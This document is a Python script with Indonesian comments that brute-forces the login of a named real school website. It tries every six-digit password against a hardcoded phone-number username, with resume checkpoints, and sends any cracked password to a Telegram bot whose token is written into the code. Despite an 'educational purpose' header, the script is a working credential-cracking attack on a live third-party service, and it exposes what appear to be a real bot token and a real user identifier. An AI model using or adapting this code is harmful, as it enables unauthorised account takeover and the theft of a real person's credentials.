#!/usr/bin/env python3
"""
Script Brute Force untuk Testing Website Sendiri
Educational Purpose Only - Testing agendasekolah.id
"""

import requests
import time
import sys
from urllib.parse import urlencode
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class BruteForceLogin:
    def __init__(self):
        # Target website configuration
        self.login_url = "https://agendasekolah.id/pass.asp"
        self.logout_url = "https://agendasekolah.id/logout.asp"  # URL untuk logout otomatis
        self.success_indicator = "e_learning_siswa.asp"
        self.failure_indicator = "pass_user.asp"
        
        # Username yang akan digunakan (sesuaikan dengan target testing Anda)
        self.username = "081288747986"  # GANTI INI DENGAN USERNAME TARGET ANDA!
        
        # Checkpoint configuration - save progress setiap X attempts
        self.checkpoint_interval = 50  # Save checkpoint setiap 50 attempts
        self.checkpoint_file = "bruteforce_checkpoint.json"
        
        # Statistics
        self.attempts = 0
        self.start_time = time.time()
        self.current_password_index = 0  # Track posisi current dalam password range
        
        # Session untuk maintain cookies
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Load checkpoint jika ada untuk resume execution
        self.load_checkpoint()
        
        # Notification Settings (opsional - kosongkan jika tidak mau pakai)
        self.telegram_bot_token = "8417649107:AAFc7HeQv2sPr1WSXlnCJFvT00QBPygQ4h4"  # Bot token dari BotFather
        self.telegram_chat_id = "7042482750"    # Chat ID Anda
        self.email_smtp_server = "smtp.gmail.com"
        self.email_smtp_port = 587
        self.email_sender = ""        # Email pengirim
        self.email_password = ""      # App password email
        self.email_receiver = ""      # Email penerima
    
    def save_checkpoint(self):
        """Save current progress ke file untuk resume capability"""
        import json
        checkpoint_data = {
            'current_password_index': self.current_password_index,
            'attempts': self.attempts,
            'start_time': self.start_time,
            'timestamp': time.time(),
            'username': self.username
        }
        
        try:
            with open(self.checkpoint_file, 'w') as f:
                json.dump(checkpoint_data, f, indent=2)
            print(f"✅ Checkpoint saved: Password index {self.current_password_index}, Attempts: {self.attempts}")
        except Exception as e:
            print(f"⚠️  Failed to save checkpoint: {e}")
    
    def load_checkpoint(self):
        """Load checkpoint dari file jika ada untuk resume execution"""
        import json
        import os
        
        if not os.path.exists(self.checkpoint_file):
            print("🚀 Starting fresh brute force (no checkpoint found)")
            return
        
        try:
            with open(self.checkpoint_file, 'r') as f:
                checkpoint_data = json.load(f)
            
            self.current_password_index = checkpoint_data.get('current_password_index', 0)
            self.attempts = checkpoint_data.get('attempts', 0)
            self.start_time = checkpoint_data.get('start_time', time.time())
            
            print("🔄 Resuming from checkpoint:")
            print(f"   Starting from password index: {self.current_password_index}")
            print(f"   Previous attempts: {self.attempts}")
            print(f"   Time elapsed from original start: {time.time() - self.start_time:.0f} seconds")
            
        except Exception as e:
            print(f"⚠️  Failed to load checkpoint: {e}")
            print("🚀 Starting fresh brute force")
            self.current_password_index = 0
            self.attempts = 0
    
    def logout_from_website(self):
        """Logout dari website setelah berhasil login untuk membebaskan session"""
        try:
            # Coba logout dengan GET request ke logout endpoint
            logout_response = self.session.get(self.logout_url, timeout=10)
            
            # Verifikasi logout berhasil dengan cek apakah redirect ke login page
            if "login.asp" in logout_response.url.lower() or "login" in logout_response.text.lower():
                print("✅ Successfully logged out from website")
                return True
            else:
                print("⚠️  Logout attempt made, but verification unclear")
                return False
                
        except Exception as e:
            print(f"⚠️  Logout attempt failed: {e}")
            return False
    
    def send_telegram_notification(self, message):
        """Kirim notifikasi ke Telegram"""
        if not self.telegram_bot_token or not self.telegram_chat_id:
            return False
            
        try:
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {
                'chat_id': self.telegram_chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            response = requests.post(url, data=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram notification failed: {e}")
            return False
    
    def send_email_notification(self, subject, message):
        """Kirim notifikasi ke Email"""
        if not self.email_sender or not self.email_password or not self.email_receiver:
            return False
            
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email_sender
            msg['To'] = self.email_receiver
            msg['Subject'] = subject
            
            msg.attach(MIMEText(message, 'plain'))
            
            server = smtplib.SMTP(self.email_smtp_server, self.email_smtp_port)
            server.starttls()
            server.login(self.email_sender, self.email_password)
            text = msg.as_string()
            server.sendmail(self.email_sender, self.email_receiver, text)
            server.quit()
            return True
        except Exception as e:
            print(f"Email notification failed: {e}")
            return False
    
    def send_success_notifications(self, username, password, attempts, time_taken):
        """Kirim semua notifikasi sukses"""
        success_message = f"""
🎉 BRUTE FORCE SUCCESS! 🎉

Target: agendasekolah.id
Username: {username}
Password: {password}
Total Attempts: {attempts}
Time Taken: {time_taken:.0f} seconds

Script completed successfully!
        """
        
        print("Sending notifications...")
        
        # Telegram notification
        if self.send_telegram_notification(success_message):
            print("✅ Telegram notification sent!")
        
        # Email notification
        if self.send_email_notification("Brute Force Success!", success_message):
            print("✅ Email notification sent!")
        
        if not self.telegram_bot_token and not self.email_sender:
            print("ℹ️  No notification methods configured")
    
    def generate_passwords(self):
        """Generate password 6 digit mulai dari checkpoint terakhir"""
        # Start from checkpoint position, bukan dari 0
        start_index = self.current_password_index
        
        for i in range(start_index, 1000000):
            # Update current position untuk checkpoint
            self.current_password_index = i
            yield f"{i:06d}"
    
    def attempt_login(self, username, password):
        """Attempt login dengan credentials yang diberikan"""
        data = {
            'username': username,
            'password': password
        }
        
        try:
            response = self.session.post(
                self.login_url,
                data=data,
                allow_redirects=False,
                timeout=10
            )
            
            # Cek redirect location untuk menentukan success/failure
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if self.success_indicator in location:
                    return 'success'
                elif self.failure_indicator in location:
                    return 'failure'
                else:
                    return f'unknown_redirect: {location}'
            else:
                # Jika tidak ada redirect, cek content response
                content = response.text.lower()
                if self.success_indicator in content:
                    return 'success'
                elif self.failure_indicator in content or 'password' in content:
                    return 'failure'
                else:
                    return f'unknown_response: {response.status_code}'
                    
        except requests.exceptions.RequestException as e:
            return f'error: {str(e)}'
    
    def log_attempt(self, username, password, result, elapsed_time):
        """Log setiap attempt ke console dan file, dengan checkpoint periodic"""
        self.attempts += 1
        current_time = time.time()
        total_elapsed = current_time - self.start_time
        
        log_entry = f"[{self.attempts:06d}] {username}:{password} -> {result} ({elapsed_time:.2f}s) [Total: {total_elapsed:.0f}s]"
        print(log_entry)
        
        # Log ke file juga
        with open('bruteforce.log', 'a') as f:
            f.write(log_entry + '\n')
        
        # Save checkpoint setiap X attempts untuk recovery capability
        if self.attempts % self.checkpoint_interval == 0:
            self.save_checkpoint()
        
        # Progress info setiap 100 attempts
        if self.attempts % 100 == 0:
            rate = self.attempts / total_elapsed if total_elapsed > 0 else 0
            remaining_passwords = 1000000 - self.current_password_index
            estimated_time = remaining_passwords / rate if rate > 0 else 0
            
            print(f"📊 Progress: {self.attempts} attempts, {rate:.2f} attempts/sec")
            print(f"🔢 Current position: {self.current_password_index}/1000000 ({self.current_password_index/10000:.1f}%)")
            print(f"⏰ Estimated time remaining: {estimated_time/3600:.1f} hours")
            print("-" * 60)
    
    def run_bruteforce(self):
        """Main brute force loop"""
        print("="*60)
        print("BRUTE FORCE LOGIN TESTING")
        print(f"Target: {self.login_url}")
        print(f"Username: {self.username}")
        print("Password Range: 000000 - 999999")
        print("="*60)
        
        # Log starting info
        with open('bruteforce.log', 'w') as f:
            f.write(f"Brute Force Started: {time.ctime()}\n")
            f.write(f"Target: {self.login_url}\n")
            f.write(f"Username: {self.username}\n")
            f.write("="*60 + "\n")
        
        try:
            for password in self.generate_passwords():
                attempt_start = time.time()
                result = self.attempt_login(self.username, password)
                attempt_time = time.time() - attempt_start
                
                self.log_attempt(self.username, password, result, attempt_time)
                
                if result == 'success':
                    time_taken = time.time() - self.start_time
                    print("\n" + "="*60)
                    print("🎉 PASSWORD FOUND! 🎉")
                    print(f"Username: {self.username}")
                    print(f"Password: {password}")
                    print(f"Total Attempts: {self.attempts}")
                    print(f"Time Taken: {time_taken:.0f} seconds")
                    print("="*60)
                    
                    # Log success ke file
                    with open('bruteforce.log', 'a') as f:
                        f.write(f"\nSUCCESS! Password found: {password}\n")
                        f.write(f"Total attempts: {self.attempts}\n")
                        f.write(f"Time taken: {time_taken:.0f} seconds\n")
                    
                    # PENTING: Logout otomatis setelah berhasil login
                    print("🚪 Attempting to logout from website...")
                    logout_success = self.logout_from_website()
                    
                    if logout_success:
                        print("✅ Session cleared, website available for normal use")
                    else:
                        print("⚠️  Please manually logout from website if needed")
                    
                    # Hapus checkpoint file karena sudah selesai
                    try:
                        import os
                        if os.path.exists(self.checkpoint_file):
                            os.remove(self.checkpoint_file)
                        print("🗑️  Checkpoint file cleaned up")
                    except Exception as e:
                        print(f"⚠️  Could not remove checkpoint file: {e}")
                    
                    # Kirim notifikasi
                    self.send_success_notifications(self.username, password, self.attempts, time_taken)
                    
                    return password
                
                # Small delay untuk avoid overwhelming server
                time.sleep(0.1)
                
                # Safety break jika ada error berturut-turut
                if 'error' in result and self.attempts > 10:
                    consecutive_errors = 0
                    # Implementasi error handling bisa ditambah di sini
        
        except KeyboardInterrupt:
            print("\n\nBrute force stopped by user")
            print(f"Total attempts made: {self.attempts}")
            with open('bruteforce.log', 'a') as f:
                f.write(f"\nStopped by user after {self.attempts} attempts\n")
        
        except Exception as e:
            print(f"\nUnexpected error: {str(e)}")
            with open('bruteforce.log', 'a') as f:
                f.write(f"\nError: {str(e)}\n")
        
        return None

def main():
    """Main function"""
    # Bisa tambah argument parsing untuk konfigurasi
    if len(sys.argv) > 1:
        username = sys.argv[1]
        print(f"Using custom username: {username}")
    
    brute_forcer = BruteForceLogin()
    
    # Override username jika diperlukan
    if len(sys.argv) > 1:
        brute_forcer.username = sys.argv[1]
    
    print("Starting brute force attack...")
    print("Press Ctrl+C to stop")
    
    result = brute_forcer.run_bruteforce()
    
    if result:
        print(f"Success! Password is: {result}")
    else:
        print("Brute force completed without finding password")

if __name__ == "__main__":
    main()
